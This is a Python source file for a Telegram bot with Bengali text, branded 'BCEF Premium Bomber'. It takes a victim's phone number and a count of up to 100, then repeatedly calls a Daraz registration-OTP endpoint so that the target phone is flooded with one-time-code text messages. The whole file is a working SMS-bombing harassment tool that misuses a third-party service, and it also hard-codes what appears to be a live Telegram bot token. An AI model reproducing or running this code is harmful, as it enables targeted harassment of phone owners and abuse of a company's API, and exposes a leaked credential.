import asyncio
import httpx
import logging
import threading
import os
from flask import Flask
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application, 
    CallbackQueryHandler, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes,
    ConversationHandler
)

# --- কনফিগারেশন ---
# আপনার টোকেনটি এখানে ঠিক আছে
TELEGRAM_TOKEN = '8547857375:AAFUByPJ_OxSE9UfLO5Ny-8tJJETXcQKevM'
CHANNEL_ID = "@BangladeshCyberExpertForce"

# বোম্বিং স্টেট
PHONE, AMOUNT = range(2)

logging.basicConfig(level=logging.ERROR)

# ফ্লাস্ক সার্ভার সেটআপ (বটকে ২৪/৭ চালু রাখতে সাহায্য করে)
server = Flask(__name__)
total_sent_count = 0

@server.route('/')
def home(): 
    return "BCEF Bomber Live", 200

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    server.run(host='0.0.0.0', port=port)

# --- মেম্বারশিপ চেক ---
async def check_membership(update, context):
    try:
        user_id = update.effective_user.id
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

# --- হ্যান্ডলার ফাংশনস ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📢 Join Telegram", url="https://t.me/BangladeshCyberExpertForce")],
        [InlineKeyboardButton("✅ ভেরিফাই করুন", callback_data="verify_gate")]
    ]
    await update.message.reply_text(
        "👋 **BCEF Premium Bomber**\n\nবটটি ব্যবহার করতে আগে জয়েন করে ভেরিফাই বাটনে ক্লিক করুন।", 
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global total_sent_count
    query = update.callback_query
    await query.answer()

    if query.data == "verify_gate":
        if await check_membership(update, context):
            keyboard = [
                [InlineKeyboardButton("🚀 SMS Bombing 💣", callback_data="start_bombing")],
                [InlineKeyboardButton("📞 Call Bombing (Premium)", callback_data="call_bomb")],
                [InlineKeyboardButton("📊 Total History 📈", callback_data="history")],
                [InlineKeyboardButton("👤 Bot Developer 🛠️", callback_data="dev_info")],
                [InlineKeyboardButton("🌐 Official Website", url="https://bcef-cyber.com")]
            ]
            await query.edit_message_text("🚀 **BCEF Dashboard!**\nআপনার প্রয়োজনীয় সার্ভিসটি বেছে নিন:", 
                                         reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        else:
            await query.message.reply_text("❌ আগে চ্যানেলে জয়েন করুন, তারপর ভেরিফাই বাটনে ক্লিক করুন!")

    elif query.data == "history":
        await query.message.reply_text(f"📊 **বোম্বিং হিস্ট্রি:**\nএ পর্যন্ত মোট {total_sent_count}টি ওটিপি সফলভাবে পাঠানো হয়েছে।")
    
    elif query.data == "call_bomb":
        await query.message.reply_text("⚠️ **Call Bombing** বর্তমানে রক্ষণাবেক্ষণের অধীনে আছে। অনুগ্রহ করে SMS বোম্বিং ব্যবহার করুন।")
    
    elif query.data == "dev_info":
        await query.message.reply_text("🛠️ **বট নির্মাতা:** মোঃ মমিনুল ইসলাম\n📢 **টিম:** BCEF Cyber Expert Force\n⚡ **ভার্সন:** ২.০ (Ultra Fast)")

    elif query.data == "start_bombing":
        await query.message.reply_text("📱 বোম্বিং করার জন্য **ফোন নম্বর** লিখুন (017XXXXXXXX):")
        return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    await update.message.reply_text("🔢 কতগুলো ওটিপি পাঠাতে চান? (সর্বোচ্চ ১০০):")
    return AMOUNT

async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global total_sent_count
    try:
        amount = int(update.message.text)
        if amount > 100: amount = 100 # লিমিট সেট করা হলো
        
        phone = context.user_data['phone']
        msg = await update.message.reply_text(f"⚡ {phone} নম্বরে কাজ শুরু হয়েছে...")
        
        url = "https://member-gw.daraz.com.bd/api/gateway/v1/member/register-otp"
        payload = {"account": phone, "bizType": "register", "appId": "1"}
        
        async with httpx.AsyncClient() as client:
            for _ in range(amount):
                try:
                    await client.post(url, json=payload, timeout=5)
                    total_sent_count += 1
                    await asyncio.sleep(0.1) # একটু ফাস্ট করা হলো
                except:
                    continue
        
        await msg.edit_text(f"✅ **বোম্বিং সম্পন্ন!**\nনম্বর: {phone}\nমোট ওটিপি: {amount}")
    except ValueError:
        await update.message.reply_text("❌ শুধু সংখ্যা লিখুন।")
    return ConversationHandler.END

# --- মেইন ফাংশন ---
def main():
    # ফ্লাস্ক সার্ভার আলাদা থ্রেডে চালানো
    threading.Thread(target=run_flask, daemon=True).start()

    # টেলিগ্রাম বট সেটআপ
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    bomb_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_callback, pattern='^start_bombing$')],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
        },
        fallbacks=[],
        allow_reentry=True
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(bomb_conv)
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    print("✅ Bot is Running...")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()

